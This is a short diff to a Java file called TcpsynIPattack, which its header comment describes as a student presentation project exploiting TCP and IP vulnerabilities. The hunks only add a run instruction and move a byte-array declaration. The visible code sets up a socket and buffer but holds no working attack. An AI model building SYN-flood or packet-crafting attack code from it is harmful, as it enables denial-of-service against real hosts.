@@ -1,7 +1,7 @@
 /*
 
 David Jensen, Presentation project. This program is designed to use both TCP and IP vulnerabilities 
-
+compile and run as TcpsynIPattack.java
 
 */
 import java.io.BufferedReader;
@@ -26,7 +26,6 @@ class TcpsynIPattack {
     //declairing both the TCP, IP and special character variables
     boolean et = true;
     int count = 0;
-    byte[] charactersBytes = characters.getBytes();
     int placeholder = 0;
     Socket socket = null;
     DateTimeFormatter dtf = DateTimeFormatter.ofPattern("MM/dd/yyy");
@@ -44,6 +43,7 @@ class TcpsynIPattack {
     System.out.println("Success"); 
     ByteBuffer buf = ByteBuffer.allocate(1024);
     String characters = "!BBHHHBBH4s4s";
+    byte[] charactersBytes = characters.getBytes();
 
     buf.put(charactersBytes);
     int ipIhl = 5;
